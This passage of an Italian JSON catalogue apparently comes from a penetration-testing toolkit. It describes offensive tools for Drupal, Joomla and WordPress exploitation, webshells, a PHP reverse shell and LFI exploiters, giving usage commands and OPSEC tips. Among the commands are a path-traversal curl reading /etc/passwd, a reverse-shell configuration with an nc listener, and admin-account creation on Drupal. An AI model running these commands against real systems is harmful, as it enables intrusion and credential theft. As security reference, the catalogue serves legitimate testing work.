Accesso:</strong> Tenta di stabilire una connessione allo stream. Se il server risponde positivamente (200 OK) senza richiedere credenziali, il tool lo segnala come vulnerabile e può tentare di salvare un frame immagine come prova (screenshot).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede Python e le dipendenze installate. L'input può essere un singolo IP o una subnet.</p><pre><code># Scansione di una subnet locale\npython3 RTSPScanner.py -t 192.168.1.0/24\n\n# Scansione con output su file e screenshot attivi\npython3 RTSPScanner.py -t targets.txt --screenshot --output results.json</code></pre><p>I risultati vengono forniti in formato strutturato, indicando IP, porta, path valido ed eventuale screenshot catturato nella cartella di output.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In un <strong>Physical Security Assessment</strong>, permette di dimostrare come un attaccante possa spiare i feed video aziendali senza autenticazione. Durante un <strong>Internal Pentest</strong>, le telecamere sono spesso VLAN-hop points o dispositivi embedded con firmware non patchati che possono essere usati come pivot.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le connessioni RTSP fallite o i tentativi di indovinare il path generano log sugli NVR e sulle telecamere. Il traffico di rete è facilmente identificabile.</p><p><strong>Impatto operativo:</strong> Tentativi eccessivi su dispositivi low-power (vecchie IP camera) possono causare il freeze del servizio video o il riavvio del dispositivo.</p><p><strong>Mitigazioni:</strong> Limitare il numero di thread. Non eseguire screenshot massivi se la banda è limitata.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "RTSP"
    ],
    "notes": null
  },
  {
    "id": "drupalgeddon",
    "name": "drupalgeddon",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "",
    "desc": "Script di exploit per CVE-2014-3704 (SQL Injection) su Drupal 7 che permette Admin Account Takeover e successiva RCE.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Drupalgeddon (v1) è l'exploit per la storica vulnerabilità di SQL Injection pre-auth in Drupal 7. A differenza del suo successore (Drupalgeddon2 che è RCE diretto), questo script sfrutta la manipolazione degli array nei parametri POST per iniettare query SQL arbitrarie. L'obiettivo primario è sovrascrivere le sessioni o creare un nuovo utente amministratore nel database, garantendo il controllo totale del CMS.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Admin Creation:</strong> Inietta comandi SQL per inserire un nuovo utente con privilegi 'administrator' nella tabella <code>users</code>.</p><p><strong>Remote Code Execution:</strong> Una volta ottenuto l'accesso amministrativo, lo script può automatizzare l'abilitazione del modulo 'PHP Filter' per eseguire codice PHP arbitrario sul server.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Eseguire lo script (spesso ruby o python) contro l'URL del sito Drupal.</p><pre><code># Creazione admin (user: pwned / pass: pwned)\n./drupalgeddon.rb -t https://target.com -u pwned -p pwned\n\n# Reset password admin esistente (distruttivo)\n./drupalgeddon.rb -t https://target.com --reset-admin</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Legacy System Assessment:</strong> Utile su vecchie installazioni Drupal 7 interne o abbandonate che non sono state patchate dopo il 2014. Spesso presente in esercizi CTF.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'iniezione SQL lascia tracce evidenti nei log del database e degli errori HTTP. La creazione di utenti admin è un evento ad alta visibilità.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "CMS_Exploits",
      "Drupal"
    ],
    "notes": null
  },
  {
    "id": "drupalgeddon2",
    "name": "drupalgeddon2",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/dreadlocked/Drupalgeddon2",
    "desc": "Exploit script per CVE-2018-7600 (Drupalgeddon2), vulnerabilità critica RCE su Drupal 7/8 non autenticato.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Drupalgeddon2 è uno script di exploit per una delle vulnerabilità più gravi della storia di Drupal. Sfrutta una mancata sanitizzazione nei parametri delle Form API di Drupal (AJAX requests), permettendo a un attaccante remoto non autenticato di iniettare ed eseguire comandi di sistema arbitrari. L'exploit è altamente affidabile e colpisce installazioni default.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Unauthenticated RCE:</strong> Non richiede credenziali. Sfrutta i parametri <code>#post_render</code> o simili per passare comandi PHP/Shell.</p><p><strong>Auto-Detection:</strong> Identifica se il target è vulnerabile prima di lanciare il payload distruttivo, verificando la versione e la risposta alle richieste AJAX manipolate.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Lanciare lo script Ruby o Python contro l'URL base.</p><pre><code># Verifica e exploit (ottiene shell o esegue comando)\nruby drupalgeddon2.rb https://vulnerable-drupal.com\n\n# Esecuzione comando specifico\npython3 drupal7-cve-2018-7600.py -c \"id\" https://target.com</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>External Pentest</strong>, trovare un Drupal non patchato equivale a ottenere accesso al server web. Utile anche in CTF e ambienti legacy. La vulnerabilità è vecchia ma ancora presente in siti abbandonati o intranet.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> I payload sono facilmente firmatbili da IDS/WAF. L'esecuzione lascia log evidenti nelle richieste HTTP POST.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "CMS_Exploits",
      "Drupal"
    ],
    "notes": null
  },
  {
    "id": "joomla-bruteforce",
    "name": "joomla-bruteforce",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/ajnik/joomla-bruteforce",
    "desc": "Script multi-thread per attacchi a dizionario contro pannelli di login Joomla, con supporto per evasione token CSRF.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Questo tool è uno specialista nel cracking delle credenziali di amministrazione di Joomla. A differenza dei bruteforcer generici (come Hydra), questo script è consapevole della logica di Joomla: estrae e rinvia automaticamente il \"security token\" (CSRF token) richiesto dal CMS ad ogni tentativo di login, garantendo che i tentativi non vengano scartati silenziosamente dal server.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Token Handling:</strong> Effettua il parsing dell'HTML della pagina di login per trovare il campo hidden randomico e lo include nella richiesta POST successiva.</p><p><strong>Multithreading:</strong> Permette di testare centinaia di combinazioni al secondo.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede wordlist utenti e password.</p><pre><code># Attacco standard\npython3 joomla-brute.py -u http://target.com/administrator -w passwords.txt -user admin</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Web Pentest:</strong> Quando si identifica un Joomla esposto, spesso l'account 'admin' ha password deboli. Questo tool è necessario perché Hydra spesso fallisce contro i token CSRF di Joomla.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Genera migliaia di log di errore 403/200. Facilmente bloccato da plugin come Akeeba Admin Tools o WAF.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "CMS_Exploits",
      "Joomla"
    ],
    "notes": null
  },
  {
    "id": "joomla-dir-traversal",
    "name": "joomla_dir_trav.py",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "",
    "desc": "Script Python per sfruttare vulnerabilità di Directory Traversal nel core di Joomla (es. CVE-2019-10945) ed estrarre file di configurazione.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Questo script automatizza lo sfruttamento di vulnerabilità di path traversal note nel core di Joomla (come quelle che affliggono versioni da 1.5 a 3.9). La vulnerabilità spesso risiede in componenti come <code>com_media</code> che non filtrano adeguatamente l'input utente nei parametri dei percorsi file. Il tool permette di leggere file sensibili come <code>configuration.php</code> fuori dalla root web.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Config Extraction:</strong> Mira specificamente al file di configurazione di Joomla per estrarre le credenziali del database e le chiavi segrete.</p><p><strong>Evasione Filtri:</strong> Implementa tecniche di bypass comuni per il traversal, come l'uso di encoding URL o path troncati per aggirare controlli di base.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Eseguire lo script specificando l'URL base di Joomla.</p><pre><code># Tentativo di lettura configuration.php\npython3 joomla_dir_trav.py --url http://target.com --file ../configuration.php</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Legacy CMS Audit:</strong> Efficace su installazioni Joomla non aggiornate. L'accesso al file di configurazione garantisce quasi sempre l'accesso al database o la possibilità di creare una sessione admin.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Pattern <code>../</code> nell'URL sono altamente sospetti e loggati. I moderni WAF bloccano questi tentativi di default.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "CMS_Exploits",
      "Joomla"
    ],
    "notes": null
  },
  {
    "id": "wp-cve-2024-9047",
    "name": "CVE-2024-9047",
    "version": "2024-9047",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "",
    "desc": "Exploit per vulnerabilità critica Path Traversal nel plugin WordPress \"File Upload\" che consente lettura/cancellazione file arbitrari.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>CVE-2024-9047 è una vulnerabilità ad alto impatto (CVSS 9.8) che colpisce il plugin \"WordPress File Upload\" (versioni <= 4.24.11). La falla risiede nella mancata sanitizzazione dei percorsi nel file <code>wfu_file_downloader.php</code>, permettendo a un attaccante non autenticato di leggere file sensibili (come <code>wp-config.php</code>) o cancellare file di sistema arbitrari, portando spesso alla compromissione totale del sito tramite estrazione di credenziali database o Denial of Service.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Arbitrary File Read:</strong> Sfrutta sequenze di path traversal (<code>../</code>) per evadere la directory di upload e scaricare file di configurazione critici contenenti salt, chiavi segrete e password database.</p><p><strong>Arbitrary File Deletion:</strong> Oltre alla lettura, l'exploit può essere adattato per cancellare file vitali per il funzionamento del server, causando un crash immediato dell'applicazione web.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Lanciare lo script Python contro il target specificando il file da leggere.</p><pre><code># Lettura wp-config.php\npython3 exploit_cve_2024_9047.py -u https://target.com -f /var/www/html/wp-config.php\n\n# Verifica vulnerabilità (check non invasivo)\ncurl -v \"https://target.com/wp-content/plugins/wp-file-upload/wfu_file_downloader.php?file=../../../../etc/passwd\"</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Web App Pentest:</strong> Durante l'analisi di siti WordPress, questa CVE offre un vettore di accesso immediato (Initial Access) senza necessità di credenziali. È particolarmente efficace perché il plugin è molto diffuso (oltre 100k installazioni).</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le richieste HTTP contenenti <code>../</code> o percorsi assoluti sono facilmente rilevabili dai WAF. I log di accesso mostreranno chiamate anomale a <code>wfu_file_downloader.php</code>.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "CMS_Exploits",
      "WordPress"
    ],
    "notes": null
  },
  {
    "id": "wp-wpdiscuz-rce",
    "name": "RCE - wpDiscuz",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://www.exploit-db.com/exploits/49967",
    "desc": "Exploit per vulnerabilità Critical RCE nel plugin wpDiscuz (CVE-2020-24186) tramite upload immagini non sanitizzato.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Questa vulnerabilità colpisce il popolare plugin di commenti wpDiscuz (versioni 7.0.0 - 7.0.4). Il plugin permetteva agli utenti di caricare immagini nei commenti, ma controllava solo l'estensione del file e non il contenuto o l'intestazione MIME type in modo sicuro. Un attaccante può caricare un file PHP mascherato (es. con magic bytes GIF) che viene salvato sul server ed eseguibile, portando a Remote Code Execution.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Upload Bypass:</strong> Carica un file con estensione doppia o spoofata che contiene payload PHP, aggirando i controlli lato client/server.</p><p><strong>Execution:</strong> Recupera il path del file caricato dalla risposta AJAX e lo invoca per eseguire la shell.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Script Python o modulo Metasploit.</p><pre><code># Exploit automatico (ottiene shell)\npython3 wpDiscuz_RCE.py -u https://target.com -p /blog-post-url\n\n# Metasploit\nuse exploit/unix/webapp/wp_wpdiscuz_unauthenticated_file_upload</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Web Pentest:</strong> Vettore di ingresso molto comune nel 2020/2021. Utile per dimostrare l'importanza di disabilitare l'esecuzione di script nelle directory di upload (hardening).</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p>Vulnerabilità patchata nelle versioni recenti. Rischio alto di lasciare shell accessibili pubblicamente se non rimossi i file.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "CMS_Exploits",
      "WordPress"
    ],
    "notes": null
  },
  {
    "id": "wpxploit-1-0-0",
    "name": "wpxploit",
    "version": "1.0.0",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/relarizky/wpxploit",
    "desc": "Scanner di vulnerabilità WordPress automatizzato che controlla versioni core, temi e plugin contro database exploit noti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>WPXploit è uno strumento di audit per siti WordPress. Simile a WPScan, esegue il fingerprinting dell'installazione per rilevare versioni di plugin e temi, confrontandoli con database di vulnerabilità pubbliche. Mira a fornire una lista rapida di vettori di attacco sfruttabili su installazioni WordPress non mantenute.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Enumerazione:</strong> Rileva utenti, timthumb, directory listing e backup.</p><p><strong>Exploit Database:</strong> Integra riferimenti a Exploit-DB per i componenti rilevati.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Script Python.</p><pre><code># Scansione target\npython3 wpxploit.py --url https://target.com</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Web Assessment:</strong> Quick check per siti WP.</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p>Meno aggiornato di WPScan, usare come seconda opinione.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "CMS_Exploits",
      "WordPress"
    ],
    "notes": null
  },
  {
    "id": "wpxstrike",
    "name": "WPXStrike",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/nowak0x01/WPXStrike",
    "desc": "Tool moderno per WordPress Recon e Exploit con focus su enumerazione aggressiva e rilevamento WAF.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>WPXStrike combina funzionalità di ricognizione e attacco per WordPress. Oltre alla classica enumerazione di plugin, include moduli per rilevare WAF (Web Application Firewall) e bypassare protezioni semplici. È progettato per essere veloce e fornire report dettagliati sulla superficie d'attacco.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Active Recon:</strong> Bruteforce di path xmlrpc.php e wp-login.php.</p><p><strong>WAF Detection:</strong> Identifica Cloudflare o altri proxy.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>CLI Python.</p><pre><code># Scan completo\npython3 wpxstrike.py -u https://target.com --crawl</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Bug Bounty:</strong> Automazione della fase di discovery su target WP multipli.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Traffico di scansione attivo, genera molti 404.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "CMS_Exploits",
      "WordPress"
    ],
    "notes": null
  },
  {
    "id": "phpbash",
    "name": "phpbash",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/Arrexel/phpbash",
    "desc": "Webshell PHP con interfaccia terminale simulata nel browser, utile quando non è possibile stabilire connessioni reverse.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>PHPBash è una webshell standalone che simula un terminale bash direttamente nel browser. A differenza di una reverse shell che richiede una connessione in uscita verso l'attaccante (spesso bloccata dai firewall), PHPBash funziona interamente sopra HTTP (request/response), permettendo di navigare il file system ed eseguire comandi in modo interattivo e visivo anche in ambienti di rete restrittivi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Firewall Bypass:</strong> Non richiede porte in uscita aperte o connessioni TCP dirette. Tutto il traffico è HTTP standard sulla porta 80/443.</p><p><strong>UI Intuitiva:</strong> Mantiene la directory corrente (cd funziona grazie alla gestione sessione) e mostra l'output colorato, simulando una vera esperienza terminale.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Caricare il file <code>phpbash.php</code> sul server e visitarlo.</p><pre><code># Navigazione browser\nhttp://target.com/uploads/phpbash.php</code></pre><p>Si aprirà una pagina web con un prompt nero dove digitare comandi.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Restricted Networks:</strong> Quando una reverse shell fallisce perché il server target non può connettersi a Internet o all'IP attaccante. PHPBash fornisce un'alternativa immediata per l'enumerazione.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> I log web mostreranno molte richieste POST verso lo stesso file PHP. Non è persistente e l'accesso è visibile a chiunque conosca l'URL.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "File_Upload"
    ],
    "notes": null
  },
  {
    "id": "php-reverse-shell",
    "name": "php-reverse-shell",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/pentestmonkey/php-reverse-shell",
    "desc": "La classica reverse shell in PHP di PentestMonkey: file singolo per ottenere accesso remoto da server web vulnerabili.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Lo script PHP Reverse Shell di PentestMonkey è probabilmente il file più caricato nella storia del web pentesting. È uno script PHP autonomo che, quando visitato via browser, apre una connessione TCP in uscita verso l'IP dell'attaccante e vi collega una shell interattiva (<code>/bin/sh</code>). È il payload standard per sfruttare vulnerabilità di File Upload o RCE su stack LAMP.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Robustezza:</strong> Tenta di usare diversi metodi per eseguire comandi (<code>exec</code>, <code>shell_exec</code>, <code>system</code>, <code>passthru</code>) bypassando alcune restrizioni di configurazione PHP.</p><p><strong>Configurabilità:</strong> Basta modificare due variabili all'inizio del file (IP e PORTA) per renderlo pronto all'uso.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Modificare il file e caricarlo sul target.</p><pre><code># Modifica variabili\n$ip = '10.10.14.5'; $port = 1234;\n\n# Listener locale (attaccante)\nnc -lvnp 1234\n\n# Trigger (visitando l'URL)\ncurl http://target.com/uploads/shell.php</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Exploitation Web:</strong> Ogni volta che si trova un form di upload non sicuro o una RCE, questo è il payload per trasformare l'accesso web in accesso al sistema operativo.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Gli antivirus rilevano questo file staticamente immediatamente. Il traffico di reverse shell in chiaro è rilevabile da IDS.</p><p><strong>Mitigazioni:</strong> Usare versioni offuscate (es. Weevely) o cifrate se l'AV è presente.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "File_Upload"
    ],
    "notes": null
  },
  {
    "id": "tomcat-cmd-jsp",
    "name": "Tomcat_cmd.jsp",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/SecurityRiskAdvisors/cmd.jsp",
    "desc": "Webshell JSP minimalista per Apache Tomcat che fornisce esecuzione comandi via parametro HTTP.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>È una classica webshell scritta in Java Server Pages (JSP), progettata per essere caricata su server Tomcat (spesso tramite Manager App o exploit di upload). Una volta deployata, permette di eseguire comandi di sistema sul server ospite passando il comando come parametro nell'URL, restituendo l'output nel browser.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Command Execution:</strong> Usa <code>Runtime.getRuntime().exec()</code> per invocare shell comandi (cmd.exe o /bin/sh).</p><p><strong>Cross-Platform:</strong> Funziona su Tomcat Windows e Linux indistintamente.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Upload del file .jsp e visita browser.</p><pre><code># Esecuzione comando 'id'\nhttp://target.com/uploads/tomcat_cmd.jsp?cmd=id</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Post-Exploitation Tomcat:</strong> Payload standard quando si trovano credenziali di Tomcat Manager (tomcat:s3cret) per ottenere RCE.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> File .jsp non compilati nelle directory web sono sospetti. Esecuzione di comandi shell genera processi figli di java.exe anomali.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "File_Upload"
    ],
    "notes": null
  },
  {
    "id": "wwwolf-php-webshell",
    "name": "wwwolf-php-webshell",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/WhiteWinterWolf/wwwolf-php-webshell",
    "desc": "Webshell PHP 'WhiteWinterWolf' ottimizzata per stabilità, file upload e bypass restrizioni (open_basedir).",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>La webshell di WhiteWinterWolf è progettata per essere leggera ma estremamente affidabile. A differenza di shell complesse che spesso si rompono su configurazioni PHP restrittive, questa shell gestisce intelligentemente i path (Windows/Linux), tenta di resettare <code>open_basedir</code> e offre un'interfaccia pulita per upload file e esecuzione comandi senza JavaScript obbligatorio.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Resilienza:</strong> Funziona anche su versioni PHP vecchie. Gestisce output stderr correttamente.</p><p><strong>File Transfer:</strong> Include funzionalità di upload e download file integrate.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Upload file .php.</p><pre><code># Accesso via browser\nhttp://target.com/shell.php</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Post-Exploitation Web:</strong> Quando serve una shell stabile per muovere file o compilare exploit locali.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> File statico su disco, signature nota. Cancellare dopo l'uso.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "File_Upload"
    ],
    "notes": null
  },
  {
    "id": "lfifreak",
    "name": "LFiFreak",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/OsandaMalith/LFiFreak",
    "desc": "Tool per sfruttamento automatico di vulnerabilità Local File Inclusion (LFI) con supporto per shell reverse e RCE via wrapper PHP.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>LFiFreak automatizza il processo spesso noioso di sfruttamento delle vulnerabilità di Local File Inclusion. Invece di testare manualmente decine di payload, il tool scansiona i parametri URL vulnerabili e tenta di trasformare una semplice lettura di file in una Remote Code Execution (RCE) completa, sfruttando wrapper PHP, log poisoning o file upload.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Wrapper Abuse:</strong> Testa automaticamente wrapper come <code>php://filter</code> per leggere sorgenti PHP codificati in base64 (evitando l'esecuzione server-side) o <code>php://input</code> e <code>data://</code> per iniettare codice arbitrario se le configurazioni lo permettono.</p><p><strong>RCE Techniques:</strong> Include tecniche avanzate per ottenere una shell: iniezione nei log di Apache/SSH (Log Poisoning) per poi includerli, o accesso ai file di sessione PHP e al file system virtuale <code>/proc/self/environ</code>.</p><p><strong>Interactive Shell:</strong> Se l'exploit ha successo, fornisce un'interfaccia pseudo-shell per inviare comandi al server vittima come se si fosse in un terminale locale.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede Python 2.7 (legacy). Si avvia specificando l'URL con il parametro vulnerabile.</p><pre><code># Scansione e attacco su parametro 'page'\npython lfifreak.py --url \"http://target.com/index.php?page=FUZZ\"\n\n# Tentativo specifico di RCE via access.log\npython lfifreak.py --url \"http://target.com/vuln.php?file=\" --method logs</code></pre><p>Il tool chiederà interattivamente quali payload testare e mostrerà l'output dei comandi eseguiti.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante un <strong>Web Pentest</strong>, quando si individua una potenziale LFI ma i file comuni (<code>/etc/passwd</code>) non portano a nulla di interessante. LFiFreak permette di scalare rapidamente la vulnerabilità per ottenere accesso al sistema operativo sottostante.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> I payload di path traversal (<code>../../etc/passwd</code>) sono signature classiche per qualsiasi WAF/IDS. Il log poisoning lascia tracce permanenti e visibili nei log di sistema del server.</p><p><strong>Impatto operativo:</strong> L'iniezione di codice nei log o nelle sessioni può corrompere file critici, potenzialmente causando DoS del servizio web.</p><p><strong>Mitigazioni:</strong> Usare encoding (URL, Double URL) per offuscare i payload. Verificare manualmente l'esistenza della vuln con payload innocui prima di lanciare l'automazione.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "LFI"
    ],
    "notes": null
  },
  {
    "id": "lfisuite",
    "name": "LFISuite",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/D35m0nd142/LFISuite",
    "desc": "Scanner e exploiter automatico per vulnerabilità Local File Inclusion (LFI) con 50+ metodi di bypass WAF e shell upload.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>LFISuite automatizza la ricerca e lo sfruttamento di vulnerabilità LFI. Invece di testare manualmente payload come <code>../../etc/passwd</code>, questo tool itera attraverso decine di tecniche di evasione (null byte, encoding, wrapper PHP) per aggirare filtri e WAF. Se possibile, tenta di convertire la LFI in RCE tramite tecniche come <code>/proc/self/environ</code> injection o log poisoning.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>WAF Bypass:</strong> Utilizza diverse strategie (path truncation, URL encoding, double encoding) per nascondere il traversamento delle directory.</p><p><strong>Reverse Shell:</strong> Include una modalità automatica per ottenere una shell inversa se rileva che può includere file remoti (RFI) o iniettare codice.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Script Python 2 interattivo.</p><pre><code># Avvio interfaccia\npython2 lfisuite.py\n# Selezionare \"Scanner\" o \"Exploiter\" e inserire URL/Cookie</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Web App Pentest:</strong> Quando si sospetta una LFI ma i payload standard falliscono. LFISuite prova esaustivamente le varianti per trovare quella che funziona.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Estremamente rumoroso. Invia centinaia di richieste malevole in pochi secondi. Sicuro trigger per qualsiasi IDS.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "LFI"
    ],
    "notes": null
  },
  {
    "id": "liffy",
    "name": "liffy",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/mzfr/liffy",
    "desc": "Tool moderno per LFI exploitation che sfrutta wrapper PHP (data://, input://, filter://) per data extraction e RCE.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Liffy è focalizzato sullo sfruttamento avanzato delle LFI. La sua specialità è l'uso dei wrapper <code>php://filter</code> per estrarre file sorgente codificati in base64 (bypassando l'esecuzione) e <code>data://</code> wrapper per ottenere esecuzione di codice remota immediata. È più mirato e meno rumoroso di LFISuite.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Filter Bypassing:</strong> Automatizza la creazione di catene di filtri PHP per bypassare controlli sui caratteri.</p><p><strong>Interactive Shell:</strong> Se riesce a iniettare codice, fornisce una pseudo-shell comoda per navigare il server.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Python 3 CLI.</p><pre><code># Dump sorgente file index.php\npython3 liffy.py -u http://target.com/index.php?page=FUZZ --data /var/www/html/index.php\n\n# Tentativo RCE\npython3 liffy.py -u http://target.com/vuln.php?page=FUZZ --shell</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>CTF & Code Audit:</strong> Per leggere il codice sorgente di altri file PHP (config.php) e trovare credenziali database hardcoded.</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p>Richiede che <code>allow_url_include</code> sia attivo per alcune tecniche RCE.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "LFI"
    ],
    "notes": null
  },
  {
    "id": "xsstrike-3-1-6",
    "name": "XSStrike",
    "version": "3.1.6",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/s0md3v/XSStrike",
    "desc": "Suite avanzata per rilevamento XSS con analisi del contesto, fuzzing intelligente e generazione payload (non solo regex).",
